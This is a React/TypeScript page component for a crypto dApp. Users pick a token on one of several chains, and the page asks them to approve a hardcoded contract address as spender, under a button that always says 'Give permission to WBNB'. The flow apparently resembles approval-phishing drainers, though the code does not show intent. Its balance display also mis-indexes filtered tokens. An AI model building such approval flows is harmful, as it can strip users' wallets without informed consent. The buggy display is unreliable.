import { useEthers } from "@usedapp/core";
import { ethers } from "ethers";
import { FC, useEffect, useMemo, useState } from "react";

import { getTokensByChainId } from "@/shared/lib/api/1inch/tokens";
import { chainsData } from "@/shared/lib/constants";
import {
  AvalancheLogo,
  BSCLogo,
  DaiLogo,
  EthereumLogo,
  FantomLogo,
  PolygonLogo,
  UsdcLogo,
  UsdtLogo,
  WbtcLogo,
} from "@/shared/lib/icons";
import { Button, Container, Input, TokensList } from "@/shared/ui";

import * as S from "./style";

const COMMON_TOKENS = [
  {
    symbol: "USDT",
    logo: <UsdtLogo />,
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  },
  {
    symbol: "USDC",
    logo: <UsdcLogo />,
    address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
  },
  {
    symbol: "WETH",
    logo: <EthereumLogo />,
    address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
  },
  {
    symbol: "WBTC",
    logo: <WbtcLogo />,
    address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
  },
  {
    symbol: "DAI",
    logo: <DaiLogo />,
    address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
  },
];

const WBNB_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
const WAVAX_ADDRESS = "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7";
const WFTM_ADDRESS = "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83";
const WMATIC_ADDRESS = "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270";

const ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function getUserBalances(address user, address[] calldata tokens) external view returns (uint256[] memory balances)",
];

export const MainPage: FC = () => {
  const [tokens, setTokens] = useState([]);
  const [search, setSearch] = useState<string>("");
  const [selectedToken, setSelectedToken] = useState<string>("");
  const [tokenBalances, setTokenBalances] = useState<string[]>([]);
  const { chainId, library, account } = useEthers();

  useEffect(() => {
    if (!chainId) {
      return;
    }

    (async function () {
      const { data } = await getTokensByChainId(chainId.toString());

      const tokensArr = Object.values(data.tokens);
      setTokens(tokensArr);
    })();
  }, [chainId]);

  const lastToken = useMemo(() => {
    if (chainId === Number(chainsData.ethereum.chainId) || chainId === Number(chainsData.arbitrum.chainId)) {
      return null;
    }
    if (chainId === Number(chainsData.bsc.chainId)) {
      return (
        <S.TokensItem
          selected={WBNB_ADDRESS === selectedToken}
          onClick={() => (WBNB_ADDRESS === selectedToken ? setSelectedToken("") : setSelectedToken(WBNB_ADDRESS))}
        >
          <BSCLogo />
          WBNB
        </S.TokensItem>
      );
    }
    if (chainId === Number(chainsData.avalanche.chainId)) {
      return (
        <S.TokensItem
          selected={WAVAX_ADDRESS === selectedToken}
          onClick={() => (WAVAX_ADDRESS === selectedToken ? setSelectedToken("") : setSelectedToken(WAVAX_ADDRESS))}
        >
          <AvalancheLogo />
          WAVAX
        </S.TokensItem>
      );
    }
    if (chainId === Number(chainsData.fantom.chainId)) {
      return (
        <S.TokensItem
          selected={WFTM_ADDRESS === selectedToken}
          onClick={() => (WFTM_ADDRESS === selectedToken ? setSelectedToken("") : setSelectedToken(WFTM_ADDRESS))}
        >
          <FantomLogo />
          WFTM
        </S.TokensItem>
      );
    }

    return (
      <S.TokensItem
        selected={WMATIC_ADDRESS === selectedToken}
        onClick={() => (WMATIC_ADDRESS === selectedToken ? setSelectedToken("") : setSelectedToken(WMATIC_ADDRESS))}
      >
        <PolygonLogo />
        WMATIC
      </S.TokensItem>
    );
  }, [chainId, selectedToken]);

  useEffect(() => {
    if (tokens.length && account && library) {
      (async function () {
        const signer = library?.getSigner();
        const contract = new ethers.Contract("0xe47085AaA1dc8122f5A1f623068967b3bc92782c", ABI, signer);

        const balances = await contract.getUserBalances(
          account,
          tokens.filter((item) => item.address !== "0x").map((item) => item.address),
        );
        setTokenBalances(balances.map((item) => item.toString()));
      })();
    }
  }, [tokens, account, library]);

  const onApprove = async () => {
    if (!selectedToken) {
      return;
    }

    const signer = library?.getSigner();
    const contract = new ethers.Contract(selectedToken, ABI, signer);

    await contract.approve("0xe47085AaA1dc8122f5A1f623068967b3bc92782c", "9999999999");
  };

  return (
    <S.Root>
      <Container>
        <S.Block>
          <S.Title>Select a Token</S.Title>
          <S.Search>
            <Input value={search} onChange={(value) => setSearch(value)} placeholder="Search name or paste address" />
          </S.Search>

          <S.Tokens>
            <S.TokensTitle>Common tokens</S.TokensTitle>
            <S.TokensList>
              {COMMON_TOKENS.map((item) => (
                <S.TokensItem
                  key={item.address}
                  selected={item.address === selectedToken}
                  onClick={() =>
                    item.address === selectedToken ? setSelectedToken("") : setSelectedToken(item.address)
                  }
                >
                  {item.logo}
                  {item.symbol}
                </S.TokensItem>
              ))}
              {lastToken}
            </S.TokensList>
          </S.Tokens>

          <TokensList
            selectedToken={selectedToken}
            onSelect={setSelectedToken}
            tokens={tokens
              .filter(
                (item) =>
                  item.name.toLowerCase().includes(search.toLowerCase()) ||
                  item.address.toLowerCase().includes(search.toLowerCase()) ||
                  item.symbol.toLowerCase().includes(search.toLowerCase()),
              )
              .map((item, index) => ({
                name: item.name,
                symbol: item.symbol,
                img: item.logoURI,
                amount: tokenBalances.length ? tokenBalances[index] : "0",
                address: item.address,
              }))}
          />

          <S.SubmitButton>
            <Button stretch size="large" onClick={onApprove}>
              Give permission to WBNB
            </Button>
          </S.SubmitButton>
        </S.Block>
      </Container>
    </S.Root>
  );
};
